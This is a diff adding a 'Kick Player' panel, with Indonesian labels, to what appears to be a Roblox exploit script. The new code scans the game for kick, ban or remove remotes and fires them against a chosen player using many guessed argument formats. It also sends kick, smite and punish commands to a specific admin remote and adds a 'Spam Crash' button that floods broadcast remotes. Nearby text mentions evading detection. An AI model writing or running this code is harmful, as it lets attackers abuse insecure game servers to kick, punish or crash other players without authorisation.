@@ -2414,6 +2414,205 @@ end)
 
 makeLabel(secAI, "💡 Tips: Radius hingga 10k stud, jeda 0 detik, noise & anti-AFK untuk hindari deteksi.")
 
+-- =============== KICK PLAYER (AI TOOLS) ===============
+makeLabel(secAI, "━━━━━━ 👢 KICK PLAYER ━━━━━━")
+
+local kickState = {
+    remoteName = "Kick",
+    targetPlayer = nil,
+    reason = "Exploited by DevTools",
+}
+
+-- Daftar player
+local kickPlayerLabel = makeLabel(secAI, "Pilih Target:")
+local kickPlayerList = Instance.new("ScrollingFrame", secAI)
+kickPlayerList.Size = UDim2.new(1, 0, 0, 120)
+kickPlayerList.BackgroundColor3 = Color3.fromRGB(22,22,30)
+kickPlayerList.ScrollBarThickness = 4
+Instance.new("UICorner", kickPlayerList).CornerRadius = UDim.new(0,6)
+
+local kickPlayerLayout = Instance.new("UIListLayout", kickPlayerList)
+kickPlayerLayout.Padding = UDim.new(0,2)
+
+local function refreshKickPlayerList()
+    for _, c in ipairs(kickPlayerList:GetChildren()) do
+        if c:IsA("Frame") then c:Destroy() end
+    end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= player then
+            local row = Instance.new("Frame")
+            row.Size = UDim2.new(1, -4, 0, 30)
+            row.BackgroundColor3 = Color3.fromRGB(40,40,40)
+            row.BorderSizePixel = 0
+            Instance.new("UICorner", row).CornerRadius = UDim.new(0,4)
+            row.Parent = kickPlayerList
+
+            local nameBtn = Instance.new("TextButton", row)
+            nameBtn.Size = UDim2.new(0.85, 0, 1, 0)
+            nameBtn.Text = p.Name
+            nameBtn.BackgroundTransparency = 1
+            nameBtn.TextColor3 = Color3.new(1,1,1)
+            nameBtn.Font = Enum.Font.Gotham
+            nameBtn.TextSize = 14
+            nameBtn.MouseButton1Click:Connect(function()
+                kickState.targetPlayer = p
+                kickStatusLabel.Text = "Target: " .. p.Name
+            end)
+
+            local selectBtn = Instance.new("TextButton", row)
+            selectBtn.Size = UDim2.new(0.15, 0, 1, 0)
+            selectBtn.Position = UDim2.new(0.85,0,0,0)
+            selectBtn.Text = "🎯"
+            selectBtn.BackgroundColor3 = Color3.fromRGB(200,100,50)
+            selectBtn.Font = Enum.Font.GothamBold
+            selectBtn.TextSize = 12
+            Instance.new("UICorner", selectBtn).CornerRadius = UDim.new(0,4)
+            selectBtn.MouseButton1Click:Connect(function()
+                kickState.targetPlayer = p
+                kickStatusLabel.Text = "Target: " .. p.Name
+            end)
+        end
+    end
+    kickPlayerList.CanvasSize = UDim2.new(0,0,0,kickPlayerLayout.AbsoluteContentSize.Y + 4)
+end
+
+refreshKickPlayerList()
+Players.PlayerAdded:Connect(refreshKickPlayerList)
+Players.PlayerRemoving:Connect(refreshKickPlayerList)
+
+-- Nama remote custom
+makeLabel(secAI, "Nama Remote Kick (default: Kick):")
+local kickRemoteBox = Instance.new("TextBox", secAI)
+kickRemoteBox.Size = UDim2.new(1, 0, 0, 28)
+kickRemoteBox.BackgroundColor3 = Color3.fromRGB(34, 34, 44)
+kickRemoteBox.TextColor3 = Color3.new(1,1,1)
+kickRemoteBox.Font = Enum.Font.Gotham
+kickRemoteBox.Text = kickState.remoteName
+kickRemoteBox.TextSize = 13
+kickRemoteBox.ClearTextOnFocus = false
+Instance.new("UICorner", kickRemoteBox).CornerRadius = UDim.new(0,4)
+kickRemoteBox.FocusLost:Connect(function()
+    kickState.remoteName = kickRemoteBox.Text
+end)
+
+local kickStatusLabel = makeLabel(secAI, "Status: Pilih target")
+kickStatusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
+
+-- Fungsi mencari remote kick
+local function findKickRemote()
+    -- Cari nama persis dari textbox
+    if kickState.remoteName ~= "" then
+        for _, obj in ipairs(game:GetDescendants()) do
+            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name == kickState.remoteName then
+                return obj
+            end
+        end
+        -- Cari juga di sniffer
+        if snifferState and snifferState.remotes then
+            for _, r in pairs(snifferState.remotes) do
+                if r.object and r.object.Name == kickState.remoteName then
+                    return r.object
+                end
+            end
+        end
+    end
+    -- Cari remote dengan kata "kick" atau "ban"
+    for _, obj in ipairs(game:GetDescendants()) do
+        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
+            local lower = obj.Name:lower()
+            if lower:find("kick") or lower:find("ban") or lower:find("remove") then
+                return obj
+            end
+        end
+    end
+    return nil
+end
+
+-- Tombol Kick via Remote
+local kickBtn = makeStyledButton(secAI, "👢 Kick via Remote", Color3.fromRGB(220, 60, 60))
+kickBtn.MouseButton1Click:Connect(function()
+    if not kickState.targetPlayer then
+        kickStatusLabel.Text = "❌ Pilih target dulu!"
+        return
+    end
+    local remote = findKickRemote()
+    if not remote then
+        kickStatusLabel.Text = "❌ Remote '" .. kickState.remoteName .. "' tidak ditemukan"
+        return
+    end
+    -- Coba berbagai format argumen
+    local argsList = {
+        {kickState.targetPlayer},
+        {kickState.targetPlayer.Name},
+        {kickState.targetPlayer.UserId},
+        {kickState.targetPlayer, kickState.reason},
+        {kickState.targetPlayer.Name, kickState.reason},
+        {"kick", kickState.targetPlayer.Name},
+        {"remove", kickState.targetPlayer},
+    }
+    for _, args in ipairs(argsList) do
+        pcall(function()
+            if remote:IsA("RemoteFunction") then
+                remote:InvokeServer(unpack(args))
+            else
+                remote:FireServer(unpack(args))
+            end
+        end)
+    end
+    kickStatusLabel.Text = "✅ Kick attempts dikirim ke " .. kickState.targetPlayer.Name
+end)
+
+-- Tombol Kick via AdminEvent
+local kickAdminBtn = makeButton(secAI, "🛡 Kick via AdminEvent", Color3.fromRGB(200, 100, 200))
+kickAdminBtn.MouseButton1Click:Connect(function()
+    if not kickState.targetPlayer then
+        kickStatusLabel.Text = "❌ Pilih target dulu!"
+        return
+    end
+    local adminRemote = game:GetService("ReplicatedStorage"):FindFirstChild("ForyxeAdmin_V3")
+    if adminRemote then
+        adminRemote = adminRemote:FindFirstChild("AdminEvent")
+    end
+    if not adminRemote then
+        kickStatusLabel.Text = "❌ AdminEvent tidak ditemukan"
+        return
+    end
+    local cmds = {
+        {"kick", kickState.targetPlayer.Name},
+        {"smite", kickState.targetPlayer.Name},
+        {"punish", kickState.targetPlayer.Name},
+        {kickState.targetPlayer.Name}, -- mungkin langsung
+    }
+    for _, args in ipairs(cmds) do
+        pcall(function()
+            adminRemote:FireServer(unpack(args))
+        end)
+    end
+    kickStatusLabel.Text = "✅ Admin commands dikirim untuk " .. kickState.targetPlayer.Name
+end)
+
+-- Tombol Spam Crash (Client-side)
+local crashBtn = makeButton(secAI, "💥 Spam Crash", Color3.fromRGB(150, 50, 50))
+crashBtn.MouseButton1Click:Connect(function()
+    if not kickState.targetPlayer then
+        kickStatusLabel.Text = "❌ Pilih target dulu!"
+        return
+    end
+    kickStatusLabel.Text = "💥 Mencoba crash target..."
+    task.spawn(function()
+        -- Kirim event kosong terus-menerus ke target (hanya jika ada remote yang broadcast)
+        for _, remote in ipairs(game:GetDescendants()) do
+            if remote:IsA("RemoteEvent") and remote.Name:lower():find("replicate") or remote.Name:lower():find("broadcast") then
+                for i = 1, 100 do
+                    pcall(function() remote:FireServer(kickState.targetPlayer) end)
+                end
+            end
+        end
+    end)
+end)
+
+makeLabel(secAI, "⚠️ Hanya bekerja jika server memiliki celah keamanan.")
+
 -- =============== DEVELOPER ===============
 local execContainer = Instance.new("Frame", secDeveloper)
 execContainer.Size               = UDim2.new(1, 0, 0, 230)
